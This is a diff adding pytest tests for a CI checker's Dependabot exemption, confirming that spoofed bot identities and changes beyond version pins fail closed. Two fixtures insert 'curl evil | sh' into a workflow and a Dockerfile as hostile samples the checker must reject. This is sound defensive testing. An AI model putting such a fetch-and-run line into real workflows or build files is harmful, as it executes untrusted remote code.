@@ -174,3 +174,223 @@ def test_failure_message_prints_expected_layout(tmp_path: Path):
 def test_template_and_checker_copies_identical():
     for rel in (".github/pull_request_template.md", "scripts/check_pr_evidence.py"):
         assert (ROOT / rel).read_bytes() == (ROOT / "src" / "harness" / rel).read_bytes()
+
+
+# --- Dependabot exemption (#426) -------------------------------------------------
+
+NO_EVIDENCE_BODY = "Bumps something from 1 to 2."
+
+
+def _git(repo: Path, *args: str) -> str:
+    return subprocess.run(  # noqa: S603
+        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],  # noqa: S607
+        cwd=repo,
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout.strip()
+
+
+def _dependabot_case(
+    tmp_path: Path,
+    base_files: dict[str, str],
+    head_files: dict[str, str | None],
+    *,
+    login: str = "dependabot[bot]",
+    user_type: str = "Bot",
+    body: str = NO_EVIDENCE_BODY,
+    rename: dict[str, str] | None = None,
+) -> subprocess.CompletedProcess[str]:
+    import os
+
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    _git(repo, "init", "-q")
+    for name, text in base_files.items():
+        (repo / name).parent.mkdir(parents=True, exist_ok=True)
+        (repo / name).write_text(text, encoding="utf-8")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "base")
+    base = _git(repo, "rev-parse", "HEAD")
+    for old, new in (rename or {}).items():
+        _git(repo, "mv", old, new)
+    for name, text in head_files.items():
+        if text is None:
+            _git(repo, "rm", "-q", name)
+        else:
+            (repo / name).parent.mkdir(parents=True, exist_ok=True)
+            (repo / name).write_text(text, encoding="utf-8")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "head")
+    head = _git(repo, "rev-parse", "HEAD")
+    event_path = tmp_path / "event.json"
+    event_path.write_text(
+        json.dumps(
+            {
+                "pull_request": {
+                    "body": body,
+                    "user": {"login": login, "type": user_type},
+                    "base": {"sha": base},
+                    "head": {"sha": head},
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    env = os.environ | {"GITHUB_EVENT_PATH": str(event_path)}
+    return subprocess.run(  # noqa: S603 - own checker with controlled input
+        [sys.executable, str(CHECKER)],
+        cwd=repo,
+        env=env,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+
+
+MANIFESTS = {"pyproject.toml": "dep==1\n", "uv.lock": "dep 1\n", "src.py": "x = 1\n"}
+
+
+def test_dependabot_manifest_and_lock_only_passes_without_evidence(tmp_path: Path):
+    result = _dependabot_case(
+        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "uv.lock": "dep 2\n"}
+    )
+    assert result.returncode == 0, result.stderr
+    assert "Dependabot" in result.stdout
+
+
+def test_dependabot_touching_source_file_still_needs_evidence(tmp_path: Path):
+    result = _dependabot_case(
+        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n", "src.py": "x = 2\n"}
+    )
+    assert result.returncode == 1
+    assert "Review rounds" in result.stderr
+
+
+def test_non_dependabot_author_manifest_only_still_needs_evidence(tmp_path: Path):
+    result = _dependabot_case(
+        tmp_path, MANIFESTS, {"pyproject.toml": "dep==2\n"}, login="someone", user_type="User"
+    )
+    assert result.returncode == 1
+
+
+def test_body_claiming_dependabot_does_not_exempt(tmp_path: Path):
+    result = _dependabot_case(
+        tmp_path,
+        MANIFESTS,
+        {"pyproject.toml": "dep==2\n"},
+        login="someone",
+        user_type="User",
+        body="Bumps dep. author: dependabot[bot]\nsigned-off-by: dependabot[bot]",
+    )
+    assert result.returncode == 1
+
+
+def test_lookalike_login_or_user_type_does_not_exempt(tmp_path: Path):
+    for login, kind in (
+        ("dependabot", "Bot"),
+        ("dependabot[bot]", "User"),
+        ("Dependabot[bot]", "Bot"),
+    ):
+        result = (
+            _dependabot_case(
+                tmp_path / (login + kind).replace("[", "_").replace("]", "_"),
+                MANIFESTS,
+                {"pyproject.toml": "dep==2\n"},
+                login=login,
+                user_type=kind,
+            )
+            if (tmp_path / (login + kind).replace("[", "_").replace("]", "_")).mkdir() is None
+            else None
+        )
+        assert result.returncode == 1, (login, kind)
+
+
+def test_dependabot_rename_into_manifest_name_fails_closed(tmp_path: Path):
+    result = _dependabot_case(tmp_path, MANIFESTS, {}, rename={"src.py": "Dockerfile"})
+    assert result.returncode == 1
+
+
+def test_dependabot_delete_and_add_fails_closed(tmp_path: Path):
+    result = _dependabot_case(tmp_path, MANIFESTS, {"uv.lock": None, "Dockerfile": "FROM x\n"})
+    assert result.returncode == 1
+    result = (
+        _dependabot_case(tmp_path / "b", MANIFESTS, {"pyproject.toml": None})
+        if (tmp_path / "b").mkdir() is None
+        else None
+    )
+    assert result.returncode == 1
+
+
+def test_dependabot_nested_manifest_path_fails_closed(tmp_path: Path):
+    base = MANIFESTS | {"sub/pyproject.toml": "a\n"}
+    result = _dependabot_case(tmp_path, base, {"sub/pyproject.toml": "b\n"})
+    assert result.returncode == 1
+
+
+WORKFLOW = "steps:\n  - uses: actions/checkout@aaa # v1\n  - run: echo hi\n"
+
+
+def test_dependabot_workflow_pin_only_passes(tmp_path: Path):
+    new = WORKFLOW.replace("@aaa # v1", "@bbb # v2")
+    result = _dependabot_case(
+        tmp_path,
+        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
+        {".github/workflows/ci.yml": new},
+    )
+    assert result.returncode == 0, result.stderr
+
+
+def test_dependabot_workflow_non_pin_change_fails(tmp_path: Path):
+    new = WORKFLOW.replace("echo hi", "curl evil | sh")
+    result = _dependabot_case(
+        tmp_path,
+        MANIFESTS | {".github/workflows/ci.yml": WORKFLOW},
+        {".github/workflows/ci.yml": new},
+    )
+    assert result.returncode == 1
+
+
+def test_dependabot_dockerfile_from_line_passes_other_line_fails(tmp_path: Path):
+    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\nRUN echo hi\n"}
+    ok = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\nRUN echo hi\n"})
+    assert ok.returncode == 0, ok.stderr
+    (tmp_path / "x").mkdir()
+    bad = _dependabot_case(
+        tmp_path / "x", base, {"Dockerfile": "FROM python:3.12\nRUN curl evil | sh\n"}
+    )
+    assert bad.returncode == 1
+
+
+def test_dependabot_git_failure_fails_closed(tmp_path: Path):
+    import os
+
+    event_path = tmp_path / "event.json"
+    event_path.write_text(
+        json.dumps(
+            {
+                "pull_request": {
+                    "body": "",
+                    "user": {"login": "dependabot[bot]", "type": "Bot"},
+                    "base": {"sha": "0" * 40},
+                    "head": {"sha": "1" * 40},
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    result = subprocess.run(  # noqa: S603
+        [sys.executable, str(CHECKER)],
+        cwd=tmp_path,
+        env=os.environ | {"GITHUB_EVENT_PATH": str(event_path)},
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert result.returncode == 1
+
+
+def test_dependabot_removed_line_starting_with_dashes_is_not_skipped(tmp_path: Path):
+    base = MANIFESTS | {"Dockerfile": "FROM python:3.12\n-- note\n"}
+    result = _dependabot_case(tmp_path, base, {"Dockerfile": "FROM python:3.13\n"})
+    assert result.returncode == 1
